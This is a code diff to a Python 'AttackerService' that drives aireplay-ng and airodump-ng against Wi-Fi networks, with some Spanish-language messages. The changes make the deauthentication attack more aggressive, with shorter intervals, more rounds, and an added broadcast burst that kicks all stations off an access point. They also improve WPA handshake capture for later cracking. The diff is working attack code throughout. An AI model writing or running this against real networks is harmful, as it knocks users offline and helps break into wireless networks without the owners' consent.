@@ -29,13 +29,14 @@ _hcxtools = HcxTool()
 _reaver = ReaverTool()
 
 # ── Constants for attack tuning ──────────────────────────────────────────────
-DEAUTH_INTERVAL      = 20   # Seconds between deauth re-bursts within an attempt
-DEAUTH_COUNT_PER_BURST = 64 # Packets per burst — enough to force client disconnect
-HANDSHAKE_POLL_INTERVAL = 3 # Seconds between handshake verification checks
-WPS_TIMEOUT_DEFAULT   = 300 # 5 minutes max for WPS attacks
-MAX_DEAUTH_ROUNDS     = 8   # Max re-deauth rounds per attempt
-CHANNEL_SET_RETRIES   = 5   # Retries for setting interface channel (increased)
-CHANNEL_SET_DELAY     = 1.0 # Delay between channel set retries (increased)
+DEAUTH_INTERVAL        = 8   # Seconds between deauth re-bursts (was 20 — too slow)
+DEAUTH_COUNT_PER_BURST = 64  # Directed packets per burst
+DEAUTH_BROADCAST_COUNT = 16  # Extra broadcast packets after directed burst
+HANDSHAKE_POLL_INTERVAL = 2  # Seconds between handshake checks (was 3)
+WPS_TIMEOUT_DEFAULT    = 300  # 5 minutes max for WPS attacks
+MAX_DEAUTH_ROUNDS      = 20   # Max re-deauth rounds per attempt (was 8)
+CHANNEL_SET_RETRIES    = 5   # Retries for setting interface channel
+CHANNEL_SET_DELAY      = 1.0  # Delay between channel set retries
 
 
 async def _run_command(cmd: list[str], timeout: float = 5.0) -> tuple[int, str, str]:
@@ -280,7 +281,7 @@ class AttackerService:
                 missing.append(tool)
         return missing
 
-    async def _send_deauth_burst(
+    async def _run_deauth(
         self,
         interface: str,
         bssid: str,
@@ -288,15 +289,17 @@ class AttackerService:
         count: int,
         attack_id: str,
     ) -> AsyncIterator[dict]:
-        """Send a burst of deauth packets and yield output events."""
+        """Internal: run a single aireplay-ng deauth process and stream output."""
+        args = ["aireplay-ng", "-0", str(count), "-a", bssid]
+        if client_mac:
+            args += ["-c", client_mac]
+        args.append(interface)
+
         deauth_proc = await asyncio.create_subprocess_exec(
-            "aireplay-ng",
-            "-0", str(count),
-            "-a", bssid,
-            *(["-c", client_mac] if client_mac else []),
-            interface,
+            *args,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.STDOUT,
+            stdin=asyncio.subprocess.DEVNULL,
         )
         deauth_id = f"{attack_id}_deauth_{uuid.uuid4().hex[:4]}"
         process_manager.register(deauth_id, deauth_proc, "deauth", bssid)
@@ -316,6 +319,33 @@ class AttackerService:
                 pass
         finally:
             process_manager.mark_done(deauth_id)
+
+    async def _send_deauth_burst(
+        self,
+        interface: str,
+        bssid: str,
+        client_mac: str | None,
+        count: int,
+        attack_id: str,
+    ) -> AsyncIterator[dict]:
+        """Send deauth burst(s) and yield output events.
+
+        When a specific client is targeted:
+          1. Directed deauth  → forces the CLIENT to disconnect
+          2. Broadcast deauth → forces the AP to kick all stations (catches reconnect)
+        When broadcast mode (no client_mac):
+          1. Single broadcast deauth
+        """
+        if client_mac:
+            # Step 1 — directed at client
+            async for ev in self._run_deauth(interface, bssid, client_mac, count, attack_id):
+                yield ev
+            # Step 2 — small broadcast burst so AP also kicks the station
+            async for ev in self._run_deauth(interface, bssid, None, DEAUTH_BROADCAST_COUNT, attack_id):
+                yield ev
+        else:
+            async for ev in self._run_deauth(interface, bssid, None, count, attack_id):
+                yield ev
 
     # ──────────────────────────────────────────────────────────────────────────
     # WPA Handshake capture (improved with periodic deauth)
@@ -407,8 +437,10 @@ class AttackerService:
                     "-w", output_prefix,
                     "--output-format", "cap",
                     "--write-interval", "1",       # flush cap to disk every second
+                    "--berlin", "120",             # keep stations in cap for 2 min
                     "--ignore-negative-one",       # suppress fixed-channel noise
                     interface,
+                    stdin=asyncio.subprocess.DEVNULL,
                     stdout=asyncio.subprocess.DEVNULL,
                     stderr=airodump_log,
                 )
@@ -440,6 +472,15 @@ class AttackerService:
             try:
                 while asyncio.get_event_loop().time() < deadline:
                     now = asyncio.get_event_loop().time()
+
+                    # Detect if airodump-ng crashed unexpectedly
+                    if capture_proc.returncode is not None:
+                        yield {
+                            "type": "error",
+                            "message": f"airodump-ng terminó inesperadamente (código {capture_proc.returncode}). "
+                                       "Verifica modo monitor.",
+                        }
+                        break
 
                     # Periodic deauth bursts
                     if now - last_deauth_t >= DEAUTH_INTERVAL and deauth_round < MAX_DEAUTH_ROUNDS:
@@ -627,11 +668,13 @@ class AttackerService:
                 "--bssid", bssid,
                 "-w", output_prefix,
                 "--output-format", "csv",
-                "--write-interval", "2",
+                "--write-interval", "1",    # flush every second (was 2)
+                "--berlin", "30",            # keep stations visible for 30s after last frame
                 "--ignore-negative-one",
                 interface,
                 stdout=asyncio.subprocess.DEVNULL,
                 stderr=asyncio.subprocess.DEVNULL,
+                stdin=asyncio.subprocess.DEVNULL,
             )
         except Exception as e:
             logger.error(f"Failed to start airodump-ng for client scan: {e}")
